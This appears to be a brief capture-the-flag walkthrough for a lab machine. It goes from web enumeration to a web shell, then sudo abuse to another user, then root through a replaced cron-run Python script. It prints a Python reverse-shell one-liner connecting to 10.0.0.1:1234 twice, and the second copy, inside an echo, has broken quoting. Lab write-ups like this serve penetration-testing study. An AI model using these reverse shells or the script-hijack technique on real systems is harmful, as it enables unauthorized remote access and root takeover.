Browsing to the IP, we see a website talking about phpbash, a pentesting tool to help with interactive web shells.

Go to the github page link here and download the .php script.

Run gobuster on the IP and you will find a /dev page.

Here is the .php file from the github page, which you can use to get a shell.

I used python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' to catch a reverse shell 

Now that we're in, we can cat out the user flag and run enumeration tools

It looks like we can sudo to become the other user (scriptmanager) without a password.
I used: sudo -u scriptmanager bash

Now, in /scripts, there is a test.txt and a test.py.
The .py is writing into the .txt file.

If we remove the .py and create a new one with the following payload:
echo python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]); > exploit.py

The next time the script runs, it will spawn a reverse shell on your nc listening session as root!
